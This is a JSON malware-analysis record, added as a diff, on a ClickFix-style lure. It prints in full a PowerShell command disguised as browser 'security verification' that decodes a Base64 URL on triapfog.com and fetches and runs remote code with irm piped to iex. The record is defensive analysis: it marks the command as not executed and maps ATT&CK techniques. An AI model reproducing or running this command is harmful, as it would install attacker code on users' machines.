@@ -1,0 +1,92 @@
+{
+  "schema_version": 1,
+  "case_id": "20260825-command-pt10",
+  "analysis_date": "2026-08-25",
+  "domain": "triapfog.com",
+  "source": {
+    "path": "C:\\Users\\Administrator\\Desktop\\kentai\\clickfix-command.txt",
+    "sha256": "8326ca91fcb530acaebfa6a42ea240fdfc6321e73090043cc60f63bd4d8296b0",
+    "captured_labels": [
+      "pt10"
+    ],
+    "file_last_write_local": "2026-08-25T00:06:47.081740+09:00"
+  },
+  "command": {
+    "raw": "<# Security verification #> <# Completes the browser challenge for this device. #> <# Ticket 9D9527B1E4AE | BC7ED72F-6EC5 #> $ErrorActionPreference='SilentlyContinue';$ProgressPreference='SilentlyContinue';try{$Host.UI.RawUI.WindowTitle='Verification'}catch{};try{[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12}catch{};Write-Host 'Completing verification...' -ForegroundColor DarkYellow;function Confirm-SecuritySession { <# bind one-time session ticket #> $u=[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('aHR0cHM6Ly90cmlhcGZvZy5jb20vc2VjdXJpdHkvYzhwcHdveWU1MA==')); irm $u | iex };Confirm-SecuritySession",
+    "sha256": "1a44a4d00493aca1e833ed54f60d07141c42c196b81951fe31a6a3bc69842da8",
+    "length": 651,
+    "duplicate_count": 1,
+    "pattern": "Base64 URL復号 + Invoke-RestMethod + Invoke-Expression",
+    "deobfuscated": "https://triapfog.com/security/c8ppwoye50",
+    "stage_locator_raw": "Base64:aHR0cHM6Ly90cmlhcGZvZy5jb20vc2VjdXJpdHkvYzhwcHdveWU1MA==",
+    "stage_url_normalized": "https://triapfog.com/security/c8ppwoye50",
+    "status": "recovered_not_executed",
+    "processes": [
+      "powershell.exe"
+    ],
+    "process_chain": [
+      {
+        "sequence": 1,
+        "image": "powershell.exe",
+        "evidence": "static_command_semantics",
+        "relationship": "candidate_not_executed"
+      }
+    ],
+    "process_chain_status": "recovered_from_command_not_executed",
+    "command_line_public": "<# Security verification #> <# Completes the browser challenge for this device. #> <# Ticket 9D9527B1E4AE | BC7ED72F-6EC5 #> $ErrorActionPreference='SilentlyContinue';$ProgressPreference='SilentlyContinue';try{$Host.UI.RawUI.WindowTitle='Verification'}catch{};try{[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12}catch{};Write-Host 'Completing verification...' -ForegroundColor DarkYellow;function Confirm-SecuritySession { <# bind one-time session ticket #> $u=[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('aHR0cHM6Ly90cmlhcGZvZy5jb20vc2VjdXJpdHkvYzhwcHdveWU1MA==')); irm $u | iex };Confirm-SecuritySession",
+    "command_line_normalized": "<# Security verification #> <# Completes the browser challenge for this device. #> <# Ticket 9D9527B1E4AE | BC7ED72F-6EC5 #> $ErrorActionPreference='SilentlyContinue';$ProgressPreference='SilentlyContinue';try{$Host.UI.RawUI.WindowTitle='Verification'}catch{};try{[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12}catch{};Write-Host 'Completing verification...' -ForegroundColor DarkYellow;function Confirm-SecuritySession { <# bind one-time session ticket #> $u=[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('aHR0cHM6Ly90cmlhcGZvZy5jb20vc2VjdXJpdHkvYzhwcHdveWU1MA==')); irm $u | iex };Confirm-SecuritySession",
+    "command_line_length": 651,
+    "command_line_status": "recovered_not_executed",
+    "command_line_source": "analyst_provided_clickfix_command_file",
+    "command_sha256": "1a44a4d00493aca1e833ed54f60d07141c42c196b81951fe31a6a3bc69842da8"
+  },
+  "process_analysis": {
+    "processes": [
+      "powershell.exe"
+    ],
+    "process_chain": "既存powershell.exeへ貼り付け → Confirm-SecuritySession関数 → Base64 URL復号 → 同一powershell.exe内でHTTP応答をIEX評価",
+    "status": "static_candidate_not_observed",
+    "details": [
+      "fake browser challengeのコメントとticket文字列で正規verificationを装う。",
+      "ErrorActionPreferenceとProgressPreferenceをSilentlyContinueへ変更し、エラーと進捗を隠す。",
+      "window titleをVerificationへ変更し、TLS 1.2を強制する。",
+      "Base64値は https://triapfog.com/security/c8ppwoye50 に復号される。",
+      "Confirm-SecuritySession関数を定義後すぐ呼び、irm応答をiexで同一process内評価する。"
+    ]
+  },
+  "retrieval": {
+    "analyst_probe_url": "https://triapfog.com/security/c8ppwoye50",
+    "status": "http_403",
+    "http_status": 403,
+    "bytes": 5105,
+    "body_sha256": "1fc2b8f022b09b4076ef09e7fc4b3e6f702b5ee877837304ccd9eff30d028775",
+    "body_type": "html",
+    "payload_recovered": false,
+    "evidence_role": "current_context_only_not_runtime_proof",
+    "javascript_executed": false,
+    "powershell_executed": false,
+    "payload_executed": false
+  },
+  "terminal_payload": {
+    "status": "not_retrieved",
+    "family": null,
+    "sha256": null,
+    "additional_processes": [],
+    "persistence": [],
+    "final_attacker_command": null
+  },
+  "techniques": [
+    "T1204.004",
+    "T1059.001",
+    "T1027",
+    "T1140",
+    "T1105",
+    "T1036"
+  ],
+  "safety": {
+    "captured_command_executed": false,
+    "downloaded_script_executed": false,
+    "payload_executed": false,
+    "network_method": "bounded GET only"
+  }
+}
